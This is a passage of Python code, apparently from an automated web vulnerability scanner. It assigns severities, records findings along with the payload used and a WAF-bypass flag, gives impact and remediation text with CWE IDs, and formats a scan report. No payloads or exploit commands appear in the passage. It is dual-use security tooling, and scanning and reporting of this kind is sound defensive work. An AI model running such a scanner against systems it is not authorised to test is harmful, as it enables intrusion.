            VulnerabilityType.DIRECTORY_TRAVERSAL: SeverityLevel.HIGH,
            VulnerabilityType.SSTI: SeverityLevel.HIGH,
            VulnerabilityType.OPEN_REDIRECT: SeverityLevel.MEDIUM,
            VulnerabilityType.LFI: SeverityLevel.HIGH,
            VulnerabilityType.RFI: SeverityLevel.CRITICAL
        }

        severity = severity_map.get(payload.payload_type, SeverityLevel.MEDIUM)

        # Generate impact and remediation
        impact, remediation, cwe_id = self._get_vulnerability_details(payload.payload_type)

        finding = VulnerabilityFinding(
            finding_id=finding_id,
            vulnerability_type=payload.payload_type,
            severity=severity,
            endpoint=endpoint,
            parameter=parameter,
            payload_used=payload,
            evidence=evidence,
            request_data={
                'url': endpoint.url,
                'method': endpoint.method,
                'parameter': parameter.name if parameter else None,
                'payload': payload.payload
            },
            response_data=response_data,
            confidence=confidence,
            impact=impact,
            remediation=remediation,
            cwe_id=cwe_id,
            metadata={
                'waf_bypass': payload.waf_bypass,
                'time_based': payload.time_based
            }
        )

        return finding

    def _get_vulnerability_details(self, vuln_type: VulnerabilityType) -> Tuple[str, str, str]:
        """Get vulnerability impact, remediation, and CWE ID"""
        details = {
            VulnerabilityType.SQL_INJECTION: (
                "SQL injection can lead to unauthorized data access, data manipulation, and potential system compromise.",
                "Use parameterized queries, input validation, and principle of least privilege for database accounts.",
                "CWE-89"
            ),
            VulnerabilityType.XSS_REFLECTED: (
                "Reflected XSS can lead to session hijacking, credential theft, and client-side attacks.",
                "Implement proper input validation, output encoding, and Content Security Policy (CSP).",
                "CWE-79"
            ),
            VulnerabilityType.COMMAND_INJECTION: (
                "Command injection can lead to complete system compromise and unauthorized command execution.",
                "Avoid system calls with user input, use safe APIs, and implement strict input validation.",
                "CWE-78"
            ),
            VulnerabilityType.SSRF: (
                "SSRF can lead to access to internal systems, cloud metadata exposure, and network reconnaissance.",
                "Implement URL validation, use allowlists, and network segmentation.",
                "CWE-918"
            ),
            VulnerabilityType.DIRECTORY_TRAVERSAL: (
                "Directory traversal can lead to unauthorized file access and information disclosure.",
                "Implement proper input validation, use safe file APIs, and restrict file access permissions.",
                "CWE-22"
            )
        }

        return details.get(vuln_type, (
            "Security vulnerability that could impact application security.",
            "Implement proper input validation and security controls.",
            "CWE-Unknown"
        ))

    def generate_scan_report(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate comprehensive scan report"""
        report = []
        report.append("Advanced Vulnerability Scan Report")
        report.append("=" * 50)

        # Summary
        report.append("Summary:")
        report.append(f"  Total Vulnerabilities: {len(findings)}")
        report.append(f"  Requests Sent: {self.scan_statistics['requests_sent']}")
        report.append(f"  Scan Duration: {self.scan_statistics['scan_duration']:.2f}s")
        report.append(f"  WAF Detected: {'Yes' if self.scan_statistics['waf_detected'] else 'No'}")
        report.append("")

        # Vulnerability breakdown
        severity_counts = defaultdict(int)
        vuln_type_counts = defaultdict(int)

        for finding in findings:
            severity_counts[finding.severity.value] += 1
            vuln_type_counts[finding.vulnerability_type.value] += 1

        if severity_counts:
            report.append("Vulnerabilities by Severity:")
            for severity in ['critical', 'high', 'medium', 'low']:
                count = severity_counts.get(severity, 0)
                if count > 0:
                    report.append(f"  {severity.upper()}: {count}")
            report.append("")

        if vuln_type_counts:
            report.append("Vulnerabilities by Type:")
            for vuln_type, count in sorted(vuln_type_counts.items()):
                report.append(f"  {vuln_type}: {count}")
            report.append("")

        # Detailed findings
        if findings:
            report.append("Detailed Findings:")
            report.append("-" * 30)

            for i, finding in enumerate(findings[:20]):  # Show top 20
                report.append(f"Finding #{i+1}: {finding.vulnerability_type.value}")
                report.append(f"  Severity: {finding.severity.value.upper()}")
                report.append(f"  Confidence: {finding.confidence:.2f}")
                report.append(f"  URL: {finding.endpoint.url}")

                if finding.parameter:
                    report.append(f"  Parameter: {finding.parameter.name}")

                report.append(f"  Payload: {finding.payload_used.payload}")

                if finding.cwe_id:
                    report.append(f"  CWE: {finding.cwe_id}")

                report.append(f"  Impact: {finding.impact}")
                report.append(f"  Remediation: {finding.remediation}")

                if finding.evidence:
                    report.append("  Evidence:")
                    for evidence in finding.evidence[:3]:
                        report.append(f"    â€¢ {evidence}")

                report.append("")

        return "\n".join(report)